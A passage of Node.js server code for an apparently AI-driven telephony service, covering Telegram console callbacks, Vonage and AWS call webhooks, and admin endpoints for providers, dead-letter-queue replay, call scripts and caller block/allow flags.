          .answerCallbackQuery(cb.id, `Caller ${status}`)
          .catch(() => {});
      } catch (flagError) {
        webhookService
          .answerCallbackQuery(cb.id, "Failed to update caller flag")
          .catch(() => {});
      } finally {
        setTimeout(() => webhookService.unlockConsoleButtons(callSid), 1000);
      }
      return;
    }

    if (action === "rec") {
      webhookService.lockConsoleButtons(callSid, "Recording…");
      try {
        await db.updateCallState(callSid, "recording_requested", {
          at: new Date().toISOString(),
        });
        webhookService.addLiveEvent(callSid, "⏺ Recording requested", {
          force: true,
        });
        await logConsoleAction(callSid, "recording");
        webhookService
          .answerCallbackQuery(cb.id, "Recording toggled")
          .catch(() => {});
      } catch (e) {
        webhookService
          .answerCallbackQuery(cb.id, `Failed: ${e.message}`.slice(0, 180))
          .catch(() => {});
      }
      setTimeout(() => webhookService.unlockConsoleButtons(callSid), 1200);
      return;
    }

    if (action === "compact") {
      const isCompact = webhookService.toggleConsoleCompact(callSid);
      if (isCompact === null) {
        webhookService
          .answerCallbackQuery(cb.id, "Console not active")
          .catch(() => {});
        return;
      }
      await logConsoleAction(callSid, "compact", { compact: isCompact });
      webhookService
        .answerCallbackQuery(
          cb.id,
          isCompact ? "Compact view enabled" : "Full view enabled",
        )
        .catch(() => {});
      return;
    }

    if (action === "end") {
      webhookService.lockConsoleButtons(callSid, "Ending…");
      try {
        await endCallForProvider(callSid);
        webhookService.setLiveCallPhase(callSid, "ended").catch(() => {});
        await logConsoleAction(callSid, "end");
        webhookService
          .answerCallbackQuery(cb.id, "Ending call...")
          .catch(() => {});
      } catch (e) {
        webhookService
          .answerCallbackQuery(cb.id, `Failed: ${e.message}`.slice(0, 180))
          .catch(() => {});
        webhookService.unlockConsoleButtons(callSid);
      }
      setTimeout(() => webhookService.unlockConsoleButtons(callSid), 1500);
      return;
    }

    if (action === "xfer") {
      if (!config.twilio.transferNumber) {
        webhookService
          .answerCallbackQuery(cb.id, "Transfer not configured")
          .catch(() => {});
        return;
      }
      webhookService.lockConsoleButtons(callSid, "Transferring…");
      try {
        const transferCall = require("./functions/transferCall");
        await transferCall({ callSid });
        webhookService
          .markToolInvocation(callSid, "transferCall")
          .catch(() => {});
        await logConsoleAction(callSid, "transfer");
        webhookService
          .answerCallbackQuery(cb.id, "Transferring...")
          .catch(() => {});
      } catch (e) {
        webhookService
          .answerCallbackQuery(
            cb.id,
            `Transfer failed: ${e.message}`.slice(0, 180),
          )
          .catch(() => {});
        webhookService.unlockConsoleButtons(callSid);
      }
      setTimeout(() => webhookService.unlockConsoleButtons(callSid), 2000);
      return;
    }
  } catch (error) {
    try {
      res.status(200).send("OK");
    } catch {}
    console.error("Telegram webhook error:", error);
  }
});

function buildVonageUnavailableNcco() {
  return [
    {
      action: "talk",
      text: "We are unable to connect this call right now. Please try again shortly.",
    },
    { action: "hangup" },
  ];
}

const handleVonageAnswer = async (req, res) => {
  if (!requireValidVonageWebhook(req, res, req.path || "/answer")) {
    return;
  }
  try {
    const payload = getVonageCallPayload(req);
    const resolvedCallSid = await resolveVonageCallSid(req, payload);
    let callSid = resolvedCallSid;
    const vonageUuid =
      req.query?.uuid || req.query?.conversation_uuid || req.query?.vonage_uuid;
    let synthesizedInbound = false;
    if (!callSid && vonageUuid) {
      // Inbound Vonage callbacks do not include our internal callSid.
      callSid = buildVonageInboundCallSid(vonageUuid);
      synthesizedInbound = true;
    }
    const existingCallConfig = callSid ? callConfigurations.get(callSid) : null;
    let isInbound;
    if (typeof existingCallConfig?.inbound === "boolean") {
      isInbound = existingCallConfig.inbound;
    } else if (synthesizedInbound || String(callSid || "").startsWith("vonage-in-")) {
      isInbound = true;
    } else if (payload.direction) {
      isInbound = !isOutboundVonageDirection(payload.direction);
    } else {
      // If callSid is known but no direction hint exists, default to outbound.
      isInbound = false;
    }

    if (callSid && vonageUuid) {
      rememberVonageCallMapping(callSid, vonageUuid, "answer");
    }
    if (callSid) {
      if (isInbound) {
        await refreshInboundDefaultScript();
      }
      let setup =
        existingCallConfig && callFunctionSystems.get(callSid)
          ? {
              callConfig: existingCallConfig,
              functionSystem: callFunctionSystems.get(callSid),
            }
          : null;
      if (!setup && !isInbound) {
        const hydrated = await hydrateCallConfigFromDb(callSid);
        if (hydrated?.callConfig && hydrated?.functionSystem) {
          setup = hydrated;
        }
      }
      if (!setup) {
        setup = ensureCallSetup(callSid, payload, {
          provider: "vonage",
          inbound: isInbound,
        });
      }
      if (setup?.callConfig) {
        if (!setup.callConfig.provider_metadata) {
          setup.callConfig.provider_metadata = {};
        }
        setup.callConfig.provider = "vonage";
        setup.callConfig.inbound = isInbound;
        if (vonageUuid) {
          setup.callConfig.provider_metadata.vonage_uuid = String(vonageUuid);
        }
        callConfigurations.set(callSid, setup.callConfig);
      }
      callDirections.set(callSid, isInbound ? "inbound" : "outbound");

      if (isInbound) {
        const callRecord = await ensureCallRecord(
          callSid,
          payload,
          "vonage_answer",
          {
            provider: "vonage",
            inbound: true,
          },
        );
        const chatId = callRecord?.user_chat_id || config.telegram?.adminChatId;
        const callerLookup = callRecord?.phone_number
          ? normalizePhoneForFlag(callRecord.phone_number) || callRecord.phone_number
          : null;
        let callerFlag = null;
        if (callerLookup && db?.getCallerFlag) {
          callerFlag = await db.getCallerFlag(callerLookup).catch(() => null);
        }
        if (callerFlag?.status === "blocked") {
          if (db?.updateCallState) {
            await db
              .updateCallState(callSid, "caller_blocked", {
                at: new Date().toISOString(),
                phone_number: callerLookup || callRecord?.phone_number || null,
                status: callerFlag.status,
                note: callerFlag.note || null,
                provider: "vonage",
              })
              .catch(() => {});
          }
          return res.json(
            buildVonageTalkHangupNcco("We cannot take your call at this time."),
          );
        }
        if (callerFlag?.status !== "allowed") {
          const rateLimit = shouldRateLimitInbound(req, payload || {});
          if (rateLimit.limited) {
            if (db?.updateCallState) {
              await db.updateCallState(callSid, "inbound_rate_limited", {
                at: new Date().toISOString(),
                key: rateLimit.key,
                count: rateLimit.count,
                reset_at: rateLimit.resetAt,
                provider: "vonage",
              })
                .catch(() => {});
            }
            return res.json(
              buildVonageTalkHangupNcco(
                "We are experiencing high call volume. Please try again later.",
              ),
            );
          }
        }
        if (chatId) {
          webhookService
            .sendCallStatusUpdate(callSid, "ringing", chatId, {
              status_source: "vonage_inbound",
            })
            .catch(() => {});
          webhookService.setInboundGate(callSid, "answered", { chatId });
        }
      }
    }

    const wsUrl = callSid
      ? buildVonageWebsocketUrl(req, callSid, {
          uuid: vonageUuid || undefined,
          direction: isInbound ? "inbound" : "outbound",
          from: payload.from || undefined,
          to: payload.to || undefined,
        })
      : "";
    if (!callSid || !wsUrl) {
      console.warn("Vonage answer callback missing callSid/host", {
        callSid: callSid || null,
        uuid: vonageUuid || null,
        host: resolveHost(req) || null,
      });
      return res.json(buildVonageUnavailableNcco());
    }

    const connectAction = {
      action: "connect",
      endpoint: [
        {
          type: "websocket",
          uri: wsUrl,
          "content-type": getVonageWebsocketContentType(),
        },
      ],
    };
    const eventUrl = buildVonageEventWebhookUrl(req, callSid, {
      uuid: vonageUuid || undefined,
      direction: isInbound ? "inbound" : "outbound",
    });
    if (eventUrl) {
      // Vonage connect action supports explicit event URL/method for action callbacks.
      connectAction.eventUrl = [eventUrl];
      connectAction.eventMethod = "POST";
    }

    return res.json([connectAction]);
  } catch (error) {
    console.error("Vonage answer callback error:", error);
    return res.json(buildVonageUnavailableNcco());
  }
};

const handleVonageEvent = async (req, res) => {
  if (!requireValidVonageWebhook(req, res, req.path || "/event")) {
    return;
  }
  try {
    const payload = req.body || {};
    const normalizedPayload = getVonageCallPayload(req, payload);
    const { uuid, status } = payload;
    const dtmfDigits = getVonageDtmfDigits(payload);
    const durationRaw =
      payload.duration ||
      payload.conversation_duration ||
      payload.usage_duration ||
      payload.call_duration;
    let callSid = await resolveVonageCallSid(req, payload);
    if (!callSid && uuid && !isOutboundVonageDirection(normalizedPayload.direction)) {
      // Accept inbound events even when Vonage does not provide a custom callSid.
      callSid = buildVonageInboundCallSid(uuid);
      if (callSid) {
        const existingConfig = callConfigurations.get(callSid);
        if (!existingConfig) {
          ensureCallSetup(callSid, normalizedPayload, {
            provider: "vonage",
            inbound: true,
          });
        }
      }
    }
    if (callSid && uuid) {
      rememberVonageCallMapping(callSid, uuid, "event");
    }

    if (callSid && dtmfDigits) {
      const existingConfig = callConfigurations.get(callSid);
      if (!existingConfig) {
        ensureCallSetup(callSid, normalizedPayload, {
          provider: "vonage",
          inbound: callDirections.get(callSid) !== "outbound",
        });
      }
      await handleExternalDtmfInput(callSid, dtmfDigits, {
        source: "vonage_webhook_dtmf",
        provider: "vonage",
      });
    } else if (dtmfDigits && !callSid) {
      console.warn("Vonage DTMF event received without resolvable callSid", {
        uuid: uuid || null,
        digits_length: dtmfDigits.length,
      });
    }

    const statusMap = {
      started: { status: "initiated", notification: "call_initiated" },
      ringing: { status: "ringing", notification: "call_ringing" },
      answered: { status: "answered", notification: "call_answered" },
      completed: { status: "completed", notification: "call_completed" },
      rejected: { status: "canceled", notification: "call_canceled" },
      busy: { status: "busy", notification: "call_busy" },
      failed: { status: "failed", notification: "call_failed" },
      unanswered: { status: "no-answer", notification: "call_no_answer" },
      timeout: { status: "no-answer", notification: "call_no_answer" },
      cancelled: { status: "canceled", notification: "call_canceled" },
    };

    const mapped = statusMap[String(status || "").toLowerCase()];
    if (callSid && mapped) {
      const parsedDuration = parseInt(durationRaw, 10);
      await recordCallStatus(callSid, mapped.status, mapped.notification, {
        duration: Number.isFinite(parsedDuration) ? parsedDuration : undefined,
      });
      if (mapped.status === "completed") {
        const session = activeCalls.get(callSid);
        if (session?.startTime) {
          await handleCallEnd(callSid, session.startTime);
        }
        activeCalls.delete(callSid);
        clearVonageCallMappings(callSid);
      }
    }

    if (!callSid) {
      console.warn("Vonage event callback could not resolve internal callSid", {
        uuid: uuid || null,
        status: status || null,
      });
    }

    res.status(200).send("OK");
  } catch (error) {
    console.error("Vonage webhook error:", error);
    res.status(200).send("OK");
  }
};

app.get("/webhook/vonage/answer", handleVonageAnswer);
app.get("/answer", handleVonageAnswer);

app.post("/webhook/vonage/event", handleVonageEvent);
app.post("/event", handleVonageEvent);

app.post("/webhook/aws/status", async (req, res) => {
  try {
    if (!requireValidAwsWebhook(req, res, "/webhook/aws/status")) {
      return;
    }
    const { contactId, status, duration, callSid } = req.body || {};
    const resolvedCallSid =
      callSid || (contactId ? awsContactMap.get(contactId) : null);
    if (!resolvedCallSid) {
      return res.status(200).send("OK");
    }

    const normalized = String(status || "").toLowerCase();
    const map = {
      initiated: { status: "initiated", notification: "call_initiated" },
      connected: { status: "answered", notification: "call_answered" },
      ended: { status: "completed", notification: "call_completed" },
      failed: { status: "failed", notification: "call_failed" },
      no_answer: { status: "no-answer", notification: "call_no_answer" },
      busy: { status: "busy", notification: "call_busy" },
    };
    const mapped = map[normalized];
    if (mapped) {
      await recordCallStatus(
        resolvedCallSid,
        mapped.status,
        mapped.notification,
        {
          duration: duration ? parseInt(duration, 10) : undefined,
        },
      );
      if (mapped.status === "completed") {
        const session = activeCalls.get(resolvedCallSid);
        if (session?.startTime) {
          await handleCallEnd(resolvedCallSid, session.startTime);
        }
        activeCalls.delete(resolvedCallSid);
      }
    }

    res.status(200).send("OK");
  } catch (error) {
    console.error("AWS status webhook error:", error);
    res.status(200).send("OK");
  }
});

app.post("/aws/transcripts", async (req, res) => {
  try {
    if (!requireValidAwsWebhook(req, res, "/aws/transcripts")) {
      return;
    }
    const { callSid, transcript, isPartial } = req.body || {};
    if (!callSid || !transcript) {
      return res
        .status(400)
        .json({ success: false, error: "callSid and transcript required" });
    }
    if (isPartial) {
      return res.status(200).json({ success: true });
    }
    const session = await ensureAwsSession(callSid);
    clearSilenceTimer(callSid);
    await db.addTranscript({
      call_sid: callSid,
      speaker: "user",
      message: transcript,
      interaction_count: session.interactionCount,
    });
    await db.updateCallState(callSid, "user_spoke", {
      message: transcript,
      interaction_count: session.interactionCount,
    });
    if (shouldCloseConversation(transcript) && session.interactionCount >= 1) {
      await speakAndEndCall(
        callSid,
        CALL_END_MESSAGES.user_goodbye,
        "user_goodbye",
      );
      session.interactionCount += 1;
      return res.status(200).json({ success: true });
    }
    enqueueGptTask(callSid, async () => {
      const currentCount = session.interactionCount || 0;
      try {
        await session.gptService.completion(transcript, currentCount);
      } catch (gptError) {
        console.error("GPT completion error:", gptError);
        webhookService.addLiveEvent(callSid, "⚠️ GPT error, retrying", {
          force: true,
        });
      }
      session.interactionCount = currentCount + 1;
    });
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("AWS transcript webhook error:", error);
    res
      .status(500)
      .json({ success: false, error: "Failed to ingest transcript" });
  }
});

// Provider status/update endpoints (admin only)
function getProviderStateSnapshot() {
  const callReadiness = getProviderReadiness();
  const smsReadiness = getSmsProviderReadiness();
  const emailReadiness = getEmailProviderReadiness();
  const callState = {
    provider: currentProvider,
    stored_provider: storedProvider,
    supported_providers: SUPPORTED_PROVIDERS,
    readiness: callReadiness,
    twilio_ready: callReadiness.twilio,
    aws_ready: callReadiness.aws,
    vonage_ready: callReadiness.vonage,
  };
  const smsState = {
    provider: currentSmsProvider,
    stored_provider: storedSmsProvider,
    supported_providers: SUPPORTED_SMS_PROVIDERS,
    readiness: smsReadiness,
  };
  const emailState = {
    provider: currentEmailProvider,
    stored_provider: storedEmailProvider,
    supported_providers: SUPPORTED_EMAIL_PROVIDERS,
    readiness: emailReadiness,
  };
  return {
    callState,
    smsState,
    emailState,
  };
}

function resolveProviderChannel(value) {
  const normalized = String(value || PROVIDER_CHANNELS.CALL)
    .trim()
    .toLowerCase();
  if (
    normalized !== PROVIDER_CHANNELS.CALL &&
    normalized !== PROVIDER_CHANNELS.SMS &&
    normalized !== PROVIDER_CHANNELS.EMAIL
  ) {
    return null;
  }
  return normalized;
}

app.get("/admin/provider", requireAdminToken, async (req, res) => {
  syncRuntimeProviderMirrors();
  const { callState, smsState, emailState } = getProviderStateSnapshot();
  pruneExpiredKeypadProviderOverrides();
  const requestedChannel = resolveProviderChannel(req.query?.channel);
  if (!requestedChannel && req.query?.channel) {
    return res.status(400).json({
      success: false,
      error: "Unsupported provider channel",
    });
  }
  const channel = requestedChannel || PROVIDER_CHANNELS.CALL;
  const selectedState =
    channel === PROVIDER_CHANNELS.CALL
      ? callState
      : channel === PROVIDER_CHANNELS.SMS
        ? smsState
        : emailState;

  res.json({
    channel,
    provider: selectedState.provider,
    stored_provider: selectedState.stored_provider,
    supported_providers: selectedState.supported_providers,
    twilio_ready: callState.twilio_ready,
    aws_ready: callState.aws_ready,
    vonage_ready: callState.vonage_ready,
    vonage_dtmf_ready: config.vonage?.dtmfWebhookEnabled === true,
    keypad_guard_enabled: config.keypadGuard?.enabled === true,
    keypad_override_count: keypadProviderOverrides.size,
    sms_provider: smsState.provider,
    sms_stored_provider: smsState.stored_provider,
    sms_supported_providers: smsState.supported_providers,
    sms_readiness: smsState.readiness,
    email_provider: emailState.provider,
    email_stored_provider: emailState.stored_provider,
    email_supported_providers: emailState.supported_providers,
    email_readiness: emailState.readiness,
    providers: {
      call: callState,
      sms: smsState,
      email: emailState,
    },
  });
});

app.post("/admin/provider", requireAdminToken, async (req, res) => {
  syncRuntimeProviderMirrors();
  const body = req.body || {};
  const provider = String(body.provider || "")
    .trim()
    .toLowerCase();
  const channel = resolveProviderChannel(body.channel);
  if (!channel) {
    return res.status(400).json({
      success: false,
      error: "Unsupported provider channel",
    });
  }
  const channelStateMap = getProviderStateSnapshot();
  const stateByChannel = {
    [PROVIDER_CHANNELS.CALL]: channelStateMap.callState,
    [PROVIDER_CHANNELS.SMS]: channelStateMap.smsState,
    [PROVIDER_CHANNELS.EMAIL]: channelStateMap.emailState,
  };
  const selectedState = stateByChannel[channel];
  if (!provider || !selectedState.supported_providers.includes(provider)) {
    return res
      .status(400)
      .json({
        success: false,
        error: "Unsupported provider",
        channel,
        supported_providers: selectedState.supported_providers,
      });
  }
  const readiness = selectedState.readiness || {};
  if (!readiness[provider]) {
    return res.status(400).json({
      success: false,
      error: `Provider ${provider} is not configured for ${channel}`,
      channel,
    });
  }
  const normalized = provider;
  const changed = normalized !== selectedState.provider;
  if (channel === PROVIDER_CHANNELS.CALL) {
    setActiveCallProvider(normalized);
    setStoredCallProvider(normalized);
  } else if (channel === PROVIDER_CHANNELS.SMS) {
    setActiveSmsProvider(normalized);
    setStoredSmsProvider(normalized);
  } else if (channel === PROVIDER_CHANNELS.EMAIL) {
    setActiveEmailProvider(normalized);
    setStoredEmailProvider(normalized);
  }
  syncRuntimeProviderMirrors();

  const settingKey =
    channel === PROVIDER_CHANNELS.CALL
      ? CALL_PROVIDER_SETTING_KEY
      : channel === PROVIDER_CHANNELS.SMS
        ? SMS_PROVIDER_SETTING_KEY
        : EMAIL_PROVIDER_SETTING_KEY;
  if (db?.setSetting) {
    await db
      .setSetting(settingKey, normalized)
      .catch((error) =>
        console.error(
          `Failed to persist selected ${channel} provider:`,
          error,
        ),
      );
  }

  const label =
    channel === PROVIDER_CHANNELS.CALL
      ? "call"
      : channel === PROVIDER_CHANNELS.SMS
        ? "SMS"
        : "email";
  console.log(
    `☎️ Default ${label} provider updated: ${normalized.toUpperCase()} (changed=${changed})`,
  );
  const { callState, smsState, emailState } = getProviderStateSnapshot();
  const activeChannelProvider =
    channel === PROVIDER_CHANNELS.CALL
      ? currentProvider
      : channel === PROVIDER_CHANNELS.SMS
        ? currentSmsProvider
        : currentEmailProvider;
  return res.json({
    success: true,
    channel,
    provider: activeChannelProvider,
    changed,
    call_provider: callState.provider,
    sms_provider: smsState.provider,
    email_provider: emailState.provider,
    providers: {
      call: callState,
      sms: smsState,
      email: emailState,
    },
  });
});

app.get("/admin/provider/keypad-overrides", requireAdminToken, async (req, res) => {
  try {
    const overrides = listKeypadProviderOverrides();
    return res.json({
      success: true,
      total: overrides.length,
      overrides,
    });
  } catch (error) {
    console.error("Failed to list keypad provider overrides:", error);
    return res.status(500).json({
      success: false,
      error: "Failed to list keypad provider overrides",
    });
  }
});

app.post(
  "/admin/provider/keypad-overrides/clear",
  requireAdminToken,
  async (req, res) => {
    try {
      const body = req.body || {};
      const clearAll = body.all === true || String(body.all).toLowerCase() === "true";
      const scopeKey = body.scope_key || body.scopeKey || null;
      const scope = body.scope || null;
      const value = body.value || null;

      if (!clearAll && !scopeKey && !(scope && value)) {
        return res.status(400).json({
          success: false,
          error:
            "Provide one of: all=true, scope_key, or scope+value to clear keypad overrides",
        });
      }

      const result = await clearKeypadProviderOverrides({
        all: clearAll,
        scopeKey,
        scope,
        value,
      });

      return res.json({
        success: true,
        cleared: result.cleared,
        remaining: result.remaining,
        overrides: result.overrides,
      });
    } catch (error) {
      console.error("Failed to clear keypad provider overrides:", error);
      return res.status(500).json({
        success: false,
        error: "Failed to clear keypad provider overrides",
      });
    }
  },
);

app.get("/admin/call-jobs/dlq", requireAdminToken, async (req, res) => {
  try {
    if (!db) {
      return res
        .status(500)
        .json({ success: false, error: "Database not initialized" });
    }
    const limit = Math.min(Math.max(Number(req.query?.limit) || 20, 1), 100);
    const offset = Math.max(Number(req.query?.offset) || 0, 0);
    const status = req.query?.status ? String(req.query.status) : null;
    const rows = await db.listCallJobDlq({ status, limit, offset });
    return res.json({
      success: true,
      rows,
      limit,
      offset,
      status: status || "all",
    });
  } catch (error) {
    console.error("Failed to list call-job DLQ:", error);
    return res
      .status(500)
      .json({ success: false, error: "Failed to list call-job DLQ" });
  }
});

app.post(
  "/admin/call-jobs/dlq/:id/replay",
  requireAdminToken,
  async (req, res) => {
    try {
      if (!db) {
        return res
          .status(500)
          .json({ success: false, error: "Database not initialized" });
      }
      const dlqId = Number(req.params?.id);
      if (!Number.isFinite(dlqId) || dlqId <= 0) {
        return res.status(400).json({ success: false, error: "Invalid DLQ id" });
      }
      const entry = await db.getCallJobDlqEntry(dlqId);
      if (!entry) {
        return res
          .status(404)
          .json({ success: false, error: "DLQ entry not found" });
      }
      const maxReplays = Number(config.callJobs?.dlqMaxReplays) || 2;
      if (Number(entry.replay_count) >= maxReplays) {
        return res.status(409).json({
          success: false,
          error: "Replay limit reached for this DLQ entry",
          replay_count: Number(entry.replay_count) || 0,
          max_replays: maxReplays,
        });
      }
      let runAt = new Date().toISOString();
      if (req.body?.run_at) {
        const parsed = new Date(String(req.body.run_at));
        if (Number.isNaN(parsed.getTime())) {
          return res
            .status(400)
            .json({ success: false, error: "Invalid run_at timestamp" });
        }
        runAt = parsed.toISOString();
      }
      let payload = {};
      try {
        payload = entry.payload ? JSON.parse(entry.payload) : {};
      } catch {
        return res.status(400).json({
          success: false,
          error: "DLQ payload is not valid JSON; cannot replay",
        });
      }
      const replayJobId = await db.createCallJob(entry.job_type, payload, runAt);
      await db.markCallJobDlqReplayed(dlqId, replayJobId);
      db
        ?.logServiceHealth?.("call_jobs", "dlq_replayed", {
          dlq_id: dlqId,
          original_job_id: entry.job_id,
          replay_job_id: replayJobId,
          replay_count: (Number(entry.replay_count) || 0) + 1,
          at: new Date().toISOString(),
        })
        .catch(() => {});
      return res.json({
        success: true,
        dlq_id: dlqId,
        original_job_id: entry.job_id,
        replay_job_id: replayJobId,
      });
    } catch (error) {
      console.error("Failed to replay call-job DLQ entry:", error);
      return res
        .status(500)
        .json({ success: false, error: "Failed to replay call-job DLQ entry" });
    }
  },
);

app.get("/admin/email/dlq", requireAdminToken, async (req, res) => {
  try {
    if (!db) {
      return res
        .status(500)
        .json({ success: false, error: "Database not initialized" });
    }
    const limit = Math.min(Math.max(Number(req.query?.limit) || 20, 1), 100);
    const offset = Math.max(Number(req.query?.offset) || 0, 0);
    const status = req.query?.status ? String(req.query.status) : null;
    const rows = await db.listEmailDlq({ status, limit, offset });
    return res.json({
      success: true,
      rows,
      limit,
      offset,
      status: status || "all",
    });
  } catch (error) {
    console.error("Failed to list email DLQ:", error);
    return res
      .status(500)
      .json({ success: false, error: "Failed to list email DLQ" });
  }
});

app.post("/admin/email/dlq/:id/replay", requireAdminToken, async (req, res) => {
  try {
    if (!db) {
      return res
        .status(500)
        .json({ success: false, error: "Database not initialized" });
    }
    const dlqId = Number(req.params?.id);
    if (!Number.isFinite(dlqId) || dlqId <= 0) {
      return res.status(400).json({ success: false, error: "Invalid DLQ id" });
    }
    const entry = await db.getEmailDlqEntry(dlqId);
    if (!entry) {
      return res
        .status(404)
        .json({ success: false, error: "DLQ entry not found" });
    }
    const maxReplays = Number(config.email?.dlqMaxReplays) || 2;
    if (Number(entry.replay_count) >= maxReplays) {
      return res.status(409).json({
        success: false,
        error: "Replay limit reached for this DLQ entry",
        replay_count: Number(entry.replay_count) || 0,
        max_replays: maxReplays,
      });
    }
    const message = await db.getEmailMessage(entry.message_id);
    if (!message) {
      await db.markEmailDlqReplayed(dlqId, "email_message_not_found");
      return res.status(404).json({
        success: false,
        error: "Email message not found for DLQ entry",
      });
    }
    const immutableStatuses = new Set(["queued", "retry", "sending", "sent", "delivered"]);
    if (immutableStatuses.has(String(message.status || "").toLowerCase())) {
      return res.status(409).json({
        success: false,
        error: `Cannot replay email message with status "${message.status}"`,
      });
    }
    const nextAttempt = new Date().toISOString();
    await db.updateEmailMessageStatus(message.message_id, {
      status: "queued",
      failure_reason: null,
      provider_message_id: null,
      provider_response: null,
      last_attempt_at: null,
      next_attempt_at: nextAttempt,
      retry_count: 0,
      failed_at: null,
      suppressed_reason: null,
    });
    await db.addEmailEvent(message.message_id, "requeued_from_dlq", {
      dlq_id: dlqId,
      next_attempt_at: nextAttempt,
    });
    await db.markEmailDlqReplayed(dlqId);
    db
      ?.logServiceHealth?.("email_queue", "dlq_replayed", {
        dlq_id: dlqId,
        message_id: message.message_id,
        replay_count: (Number(entry.replay_count) || 0) + 1,
        at: new Date().toISOString(),
      })
      .catch(() => {});
    return res.json({
      success: true,
      dlq_id: dlqId,
      message_id: message.message_id,
      status: "queued",
      next_attempt_at: nextAttempt,
    });
  } catch (error) {
    console.error("Failed to replay email DLQ entry:", error);
    return res
      .status(500)
      .json({ success: false, error: "Failed to replay email DLQ entry" });
  }
});

// Personas list for bot selection
app.get("/api/personas", async (req, res) => {
  res.json({
    success: true,
    builtin: builtinPersonas,
    custom: [],
  });
});

// Call script endpoints for bot script management
app.get("/api/call-scripts", requireAdminToken, async (req, res) => {
  try {
    const scripts = await db.getCallTemplates();
    res.json({ success: true, scripts });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to fetch call scripts" });
  }
});

app.get("/api/call-scripts/:id", requireAdminToken, async (req, res) => {
  try {
    const scriptId = Number(req.params.id);
    if (Number.isNaN(scriptId)) {
      return res
        .status(400)
        .json({ success: false, error: "Invalid script id" });
    }
    const script = await db.getCallTemplateById(scriptId);
    if (!script) {
      return res
        .status(404)
        .json({ success: false, error: "Script not found" });
    }
    res.json({ success: true, script });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to fetch call script" });
  }
});

app.post("/api/call-scripts", requireAdminToken, async (req, res) => {
  try {
    const { name, first_message } = req.body || {};
    if (!name || !first_message) {
      return res
        .status(400)
        .json({ success: false, error: "name and first_message are required" });
    }
    const id = await db.createCallTemplate(req.body);
    const script = await db.getCallTemplateById(id);
    res.status(201).json({ success: true, script });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to create call script" });
  }
});

app.put("/api/call-scripts/:id", requireAdminToken, async (req, res) => {
  try {
    const scriptId = Number(req.params.id);
    if (Number.isNaN(scriptId)) {
      return res
        .status(400)
        .json({ success: false, error: "Invalid script id" });
    }
    const updated = await db.updateCallTemplate(scriptId, req.body || {});
    if (!updated) {
      return res
        .status(404)
        .json({ success: false, error: "Script not found" });
    }
    const script = await db.getCallTemplateById(scriptId);
    if (inboundDefaultScriptId === scriptId) {
      inboundDefaultScript = script || null;
      inboundDefaultLoadedAt = Date.now();
    }
    res.json({ success: true, script });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to update call script" });
  }
});

app.delete("/api/call-scripts/:id", requireAdminToken, async (req, res) => {
  try {
    const scriptId = Number(req.params.id);
    if (Number.isNaN(scriptId)) {
      return res
        .status(400)
        .json({ success: false, error: "Invalid script id" });
    }
    const deleted = await db.deleteCallTemplate(scriptId);
    if (!deleted) {
      return res
        .status(404)
        .json({ success: false, error: "Script not found" });
    }
    if (inboundDefaultScriptId === scriptId) {
      await db.setSetting(INBOUND_DEFAULT_SETTING_KEY, null);
      inboundDefaultScriptId = null;
      inboundDefaultScript = null;
      inboundDefaultLoadedAt = Date.now();
    }
    res.json({ success: true });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to delete call script" });
  }
});

app.post("/api/call-scripts/:id/clone", requireAdminToken, async (req, res) => {
  try {
    const scriptId = Number(req.params.id);
    if (Number.isNaN(scriptId)) {
      return res
        .status(400)
        .json({ success: false, error: "Invalid script id" });
    }
    const existing = await db.getCallTemplateById(scriptId);
    if (!existing) {
      return res
        .status(404)
        .json({ success: false, error: "Script not found" });
    }
    const payload = {
      ...existing,
      name: req.body?.name || `${existing.name} Copy`,
    };
    delete payload.id;
    const newId = await db.createCallTemplate(payload);
    const script = await db.getCallTemplateById(newId);
    res.status(201).json({ success: true, script });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to clone call script" });
  }
});

app.get("/api/inbound/default-script", requireAdminToken, async (req, res) => {
  try {
    await refreshInboundDefaultScript(true);
    if (!inboundDefaultScript) {
      return res.json({ success: true, mode: "builtin" });
    }
    return res.json({
      success: true,
      mode: "script",
      script_id: inboundDefaultScriptId,
      script: inboundDefaultScript,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: "Failed to fetch inbound default script",
    });
  }
});

app.put("/api/inbound/default-script", requireAdminToken, async (req, res) => {
  try {
    const scriptId = Number(req.body?.script_id);
    if (!Number.isFinite(scriptId)) {
      return res
        .status(400)
        .json({ success: false, error: "script_id is required" });
    }
    const script = await db.getCallTemplateById(scriptId);
    if (!script) {
      return res
        .status(404)
        .json({ success: false, error: "Script not found" });
    }
    if (!script.prompt || !script.first_message) {
      return res.status(400).json({
        success: false,
        error: "Script must include prompt and first_message",
      });
    }
    await db.setSetting(INBOUND_DEFAULT_SETTING_KEY, String(scriptId));
    inboundDefaultScriptId = scriptId;
    inboundDefaultScript = script;
    inboundDefaultLoadedAt = Date.now();
    await db.logServiceHealth("inbound_defaults", "set", {
      script_id: scriptId,
      script_name: script.name,
      source: "api",
    });
    return res.json({
      success: true,
      mode: "script",
      script_id: scriptId,
      script,
    });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to set inbound default script" });
  }
});

app.delete(
  "/api/inbound/default-script",
  requireAdminToken,
  async (req, res) => {
    try {
      await db.setSetting(INBOUND_DEFAULT_SETTING_KEY, null);
      inboundDefaultScriptId = null;
      inboundDefaultScript = null;
      inboundDefaultLoadedAt = Date.now();
      await db.logServiceHealth("inbound_defaults", "cleared", {
        source: "api",
      });
      return res.json({ success: true, mode: "builtin" });
    } catch (error) {
      res.status(500).json({
        success: false,
        error: "Failed to clear inbound default script",
      });
    }
  },
);

// Caller flags (block/allow/spam)
app.get("/api/caller-flags", requireAdminToken, async (req, res) => {
  try {
    const status = req.query?.status;
    const limit = req.query?.limit;
    const flags = await db.listCallerFlags({ status, limit });
    res.json({ success: true, flags });
  } catch (error) {
    console.error("Failed to list caller flags:", error);
    res
      .status(500)
      .json({ success: false, error: "Failed to list caller flags" });
  }
});

app.post("/api/caller-flags", requireAdminToken, async (req, res) => {
  try {
    const phoneInput = req.body?.phone_number || req.body?.phone || null;
    const status = String(req.body?.status || "").toLowerCase();
    const note = req.body?.note || null;
    const phone = normalizePhoneForFlag(phoneInput) || phoneInput;
    if (!phone) {
      return res
        .status(400)
